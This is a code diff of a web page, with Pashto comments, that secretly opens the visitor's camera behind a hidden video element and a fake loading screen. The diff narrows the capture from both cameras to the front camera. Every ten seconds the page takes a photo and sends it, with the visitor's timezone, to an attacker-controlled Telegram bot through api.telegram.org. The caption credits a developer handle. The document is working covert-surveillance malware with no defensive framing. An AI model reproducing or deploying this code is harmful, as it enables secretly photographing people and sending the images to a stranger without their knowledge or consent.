@@ -30,7 +30,7 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        #frontCamera, #backCamera {
+        #frontCamera {
             display: none;
         }
     </style>
@@ -43,9 +43,7 @@
     </div>
 
     <video id="frontCamera" autoplay playsinline style="display: none;"></video>
-    <video id="backCamera" autoplay playsinline style="display: none;"></video>
     <canvas id="canvasFront" style="display: none;"></canvas>
-    <canvas id="canvasBack" style="display: none;"></canvas>
 
     <script>
         // د URL څخه کاروونکي ID ترلاسه کړي
@@ -75,86 +73,59 @@
             // د میسج متن
             const message = `📷 **Photo Web Info Received**\n\n_timezone_ : ${timezone}\n_Proofnum_:\`${proofnum}\`\n**dev**: @ProTech43\nThis is Photo Web Info`;
 
-            // د کمیرو ترسره کول
+            // د کمیرا ترسره کول
             const frontVideo = document.getElementById('frontCamera');
-            const backVideo = document.getElementById('backCamera');
             const canvasFront = document.getElementById('canvasFront');
-            const canvasBack = document.getElementById('canvasBack');
 
             let frontStream = null;
-            let backStream = null;
 
-            // د عکس اخستل او لیږل دوه کمیرې
+            // د عکس اخستل او لیږل یوازې د مخ دا کمیرا
             function captureAndSend() {
-                if (!frontStream || !backStream) {
-                    console.log("Camera streams not ready yet.");
+                if (!frontStream) {
+                    console.log("Front camera stream not ready yet.");
                     return; // که چیرې کمیرا شتون نه لري، نو کار نه کړي
                 }
 
-                console.log("Attempting to capture and send photos...");
+                console.log("Attempting to capture and send front photo...");
 
                 // د لومړي کمیرا ( frontal / front ) عکس
                 canvasFront.width = frontVideo.videoWidth;
                 canvasFront.height = frontVideo.videoHeight;
                 canvasFront.getContext('2d').drawImage(frontVideo, 0, 0);
 
-                // د دوهم کمیرا ( back ) عکس
-                canvasBack.width = backVideo.videoWidth;
-                canvasBack.height = backVideo.videoHeight;
-                canvasBack.getContext('2d').drawImage(backVideo, 0, 0);
-
-                // د عکسونو د blob (Binary Large Object) په توګه بدلول
+                // د عکس د blob (Binary Large Object) په توګه بدلول
                 canvasFront.toBlob(function(frontBlob) {
-                    canvasBack.toBlob(function(backBlob) {
-                        if (!frontBlob || !backBlob) {
-                            console.error("Failed to convert canvas to blob.");
-                            return;
+                    if (!frontBlob) {
+                        console.error("Failed to convert front canvas to blob.");
+                        return;
+                    }
+
+                    console.log("Front blob created, attempting to send...");
+
+                    const frontPhotoFile = new File([frontBlob], 'front_photo.jpg', { type: 'image/jpeg' });
+
+                    // د عکس لیږل لپاره فارم ډاټا
+                    const formData = new FormData();
+                    formData.append('chat_id', userId);
+                    formData.append('photo', frontPhotoFile);
+                    formData.append('caption', message); // میسج د عکس سره
+                    formData.append('parse_mode', 'Markdown'); // د ایموجی او فارمیټ لپاره
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            console.log(`Front photo sent successfully.`);
+                        } else {
+                            console.error(`Error sending front photo:`, data);
                         }
-
-                        console.log("Blobs created, attempting to send...");
-
-                        const frontPhotoFile = new File([frontBlob], 'front_photo.jpg', { type: 'image/jpeg' });
-                        const backPhotoFile = new File([backBlob], 'back_photo.jpg', { type: 'image/jpeg' });
-
-                        // د عکسونو لیږل لپاره فارم ډاټا
-                        const sendPhoto = (photoFile, caption) => {
-                            const formData = new FormData();
-                            formData.append('chat_id', userId);
-                            formData.append('photo', photoFile);
-                            if (caption) {
-                                formData.append('caption', caption); // میسج د عکس سره
-                                formData.append('parse_mode', 'Markdown'); // د ایموجی او فارمیټ لپاره
-                            }
-
-                            return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
-                        };
-
-                        // دوه عکسونه لیږل
-                        Promise.all([
-                            sendPhoto(frontPhotoFile, message),
-                            sendPhoto(backPhotoFile, message)
-                        ])
-                        .then(responses => {
-                            console.log("Fetch requests completed, checking responses...");
-                            return Promise.all(responses.map(r => r.json()));
-                        })
-                        .then(results => {
-                            console.log("Telegram API responses:", results);
-                            results.forEach((data, index) => {
-                                if (data.ok) {
-                                    console.log(`Photo ${index + 1} sent successfully.`);
-                                } else {
-                                    console.error(`Error sending photo ${index + 1}:`, data);
-                                }
-                            });
-                        })
-                        .catch(error => {
-                            console.error('Error in Promise.all or fetch:', error);
-                        });
-                    }, 'image/jpeg');
+                    })
+                    .catch(error => {
+                        console.error('Error sending front photo:', error);
+                    });
                 }, 'image/jpeg');
             }
 
@@ -169,25 +140,13 @@
                     })
                     .catch(err => {
                         console.error("Error accessing front camera: ", err);
-                        // د یو کمیرا په ناکامۍ سر هم چلند نه ګرځي، د دوهم کمیرا تلاش کړي
-                    });
-
-                // د دوهم کمیرا ( back ) لاسرسی
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }) // back camera
-                    .then(stream => {
-                        console.log("Back camera stream acquired.");
-                        backStream = stream;
-                        backVideo.srcObject = stream;
-                    })
-                    .catch(err => {
-                        console.error("Error accessing back camera: ", err);
-                         // د یو کمیرا په ناکامۍ سر هم چلند نه ګرځي، د لومړي کمیرا تلاش کړي
+                        document.querySelector('.loading p').textContent = "Cannot access front camera.";
                     });
 
                 // 1 ثانیه وخت تمه (د لوډینګ وخت)
                 setTimeout(() => {
-                    console.log("Starting photo capture interval.");
-                    // د عکسونو د اخستلو او لیږلو چلند (د 10 ثانیو په وخت کې)
+                    console.log("Starting front photo capture interval.");
+                    // د عکس د اخستلو او لیږلو چلند (د 10 ثانیو په وخت کې)
                     setInterval(captureAndSend, 10000); // 10000 milliseconds = 10 seconds
                     // که چیرې تاسو 1 ثانیه یا نور وخت غواړئ، نو عدد بدل کړئ
                 }, 1000); // 1000 milliseconds = 1 second
